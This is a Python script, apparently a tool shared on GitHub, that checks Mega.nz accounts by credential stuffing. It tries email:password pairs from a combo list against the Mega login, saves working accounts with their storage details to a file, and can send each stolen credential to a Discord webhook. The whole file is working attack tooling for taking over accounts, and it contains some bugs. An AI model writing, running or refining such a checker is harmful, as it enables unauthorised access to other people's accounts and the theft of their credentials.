from mega import Mega
from func import create_txt, fail, hit, logo, custom, error
from multiprocessing.pool import ThreadPool as Pool
import random
import os
from discord_webhook import DiscordWebhook
from datetime import datetime

os.system("title Mega.nz Checker by Arboff")
logo()

global hits

create_txt()


input("Place your combo inside combo.txt in format EMAIL:PASSWORD and press enter.")
with open("combo.txt", "r") as g:
    lines = g.readlines()
    size = len(lines)
    g.close()
print(f"\n{size} lines detected.\n")
pool_size = 10
try:
    pool_size = int(input("Enter how many threads you want to use. Default count is 10. More threads can lead to errors and skipping hits: "))
except Exception as e:
    print("\nInput not valid. Setting default count of threads to 10.")
    pool_size = 10

print(f"\nThread Count: [{pool_size}]")

name = input("\nDefine filename: ")



filename = f"hits_{name}.txt"
print(f"\nHits will be saved to {filename}\n")

webhook_Custom = input("If you want hits to be sent to your Discord, insert webhook and press enter. Otherwise, leave blank: ")

if webhook_Custom == "":
    print("\nNo Webhook Attached\n")
else:
    print("\nWebhook Attached. Hits will be sent to webhook aswell. You will get a test message right now.\n")
    webhook = DiscordWebhook(
        url=webhook_Custom,
        content="Webhook Successfully attached. Mega.nz checker by https://github.com/arboff")
    response = webhook.execute()


input("Press Enter to begin checking. Tool coded by https://github.com/Arboff.\n\n")







checked = 1

def check(username, password):
    mega = Mega()
    try:
        m = mega.login(username, password)
        quota = m.get_quota()
        space = m.get_storage_space(giga=True)
        used = space["used"]
        used = round(used,2)
        total = space["total"]

        hit_str = (f"{username}:{password} | Used Space: {used}GB | Total Space: {total}GB | Filename: {name} | Bots Count: {pool_size} | Combo Count: {size} | Local Time: {datetime.now()}")
        print(f"{hit()} {username}:{password} | Used Space: {used}GB | Total Space: {total}GB")
        try:
            webhook = DiscordWebhook(
                url=webhook_Custom,
                content=hit_str)
            response = webhook.execute()
        except:
            print(f"{error()} Webhook Error.")

        with open(filename, "a") as e:
            e.writelines(f"{username}:{password} | Used Space: {used}GB | Total Space: {total}GB")
            hits += 1
            e.close()

    except Exception as e:
        if "User blocked" in str(e):
            print(f"{custom()} {username}:{password} is blocked.")
        else:
            print(f"{fail()} {username}:{password} is not valid.")

pool = Pool(pool_size)

with open("combo.txt", "r") as f:
    lines = f.readlines()



for item in lines:
    username,password = item.split(":")
    password = password.strip()
    username = username.strip()
    pool.apply_async(check(username,password), (username,password))

pool.close()
pool.join()


input(f"\n\n\nChecker finished. Hits exported to {filename}. Press enter to exit.")
